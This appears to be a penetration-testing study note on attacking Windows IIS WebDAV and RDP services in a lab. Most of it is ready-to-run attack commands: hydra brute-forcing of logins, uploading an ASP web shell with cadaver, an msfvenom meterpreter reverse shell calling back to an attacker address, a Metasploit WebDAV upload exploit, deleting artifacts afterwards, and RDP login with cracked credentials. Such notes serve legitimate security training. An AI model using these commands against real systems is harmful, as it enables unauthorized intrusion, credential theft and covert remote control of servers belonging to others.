# Exploiting Vulnerabilities in Windows

## IIS WebDav

WebDAV is an http extension which turns a web server into a file server so clients can interact with files on the web server - they can move, copy, edit and delete files on the webserver using webdav. This service works with iis and runs on the same ports as it. This service tends to serve files rather than web apps.

### Enumeration

If we find webdav running on a machine, it will generally be running with iis or apache on port 80 or 443 We can use an nmap script to have a look at it more:

```bash
sudo nmap -Pn -n -sV -p80 --script=http-enum 10.10.8.18
```

### Credentials

We will need valid credentials most of the time to access webdav which is usually found at `/webdav/` We can try brute forcing them if we cannot find them anywhere else:

```bash
sudo hydra -L /usr/share/wordlists/metasploit/common_users.txt -P rockyou.txt http-get://10.10.8.18/webdav
```

### Davtest

Once we have valid credentials, we can use davtest to see which file extensions can be uploaded and executed:
```bash
sudo davtest -auth messi:Password123 -url http://10.10.8.18/webdav
```

### Cadaver

Once we have found out which file extensions can be executed, we can use cadaver to put a malicious web shell onto webdav and then trigger it via a browser:

```bash
sudo cadaver http://10.10.8.18/webdav
```

We then enter our creds.

```bash
put /usr/share/webshells/asp/webshell.asp
```

We can trigger this webshell from a browser. This webshell can be used to issue commands to the server such as typing out the contents of interesting files.

Another useful attack (if we can put .asp files onto the server) is to create a malicious reverse shell using msfvenom and then use the compromised webdav service to put it onto the server:

```bash
sudo msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.24.2 lport=4444 -f asp > shell.asp
```

We then use our cadaver session: `put shell.asp`

We can now start a handler in msfconsole and trigger the malicious .asp reverse shell by visiting it in a web-browser: `http://10.2.22.238/webdav/shell.asp`

We can use our cadaver session to delete any artifacts once we have finished with them. We can use: `delete shell.asp`

We can also use cadaver to get interesting files from webdav: `get confidential.txt`

### Msfconsole

There is a module in msfconsole which automates the exploitation of webdav (assuming we have valid credentials for it and can upload and execute .asp files):

```bash
use exploit/windows/iis/iis_webdav_upload_asp
```

We need to set the `HttpUsername`, `HttpPassword`, `RHOSTS` and `PATH` options. The path will be in the format of: `set PATH /webdav/shell.asp`

## RDP

This runs on port 3389 and lets people remotely interact with machines via a gui - it is disabled by default but can be enabled - valid credentials will be needed to access it.

### Enumeration

RDP is a gui which allows users to remotely access a windows machine. It runs by default on port 3389 but this is often changed by administrators so we need to check all ports and if we get odd results with services not recognised by nmap it is worth using the msfconsole `rdp_scanner` module to see if rdp is running over that specific port: `use auxiliary/scanner/rdp/rdp_scanner` - we will need to set the `rhosts` and `rport`

### Credentials

Once we have found rdp running, we can attempt to brute force valid credentials using hydra.

>[!WARNING]
>Slow the attack down using `-t 4` as the default `-t 16` is liable to crash the remote machine

```bash
sudo hydra -L users.txt -P rockyou.txt rdp://10.2.2.8:3333 -t 4
```

### Exploitation

Once we have valid credentials, we can use a tool such as `xfreerdp` to attempt to rdp into the victim machine:

```bash
xfreerdp /u:administrator /p:"tinkerbell" /v:10.2.2.8:3333
```
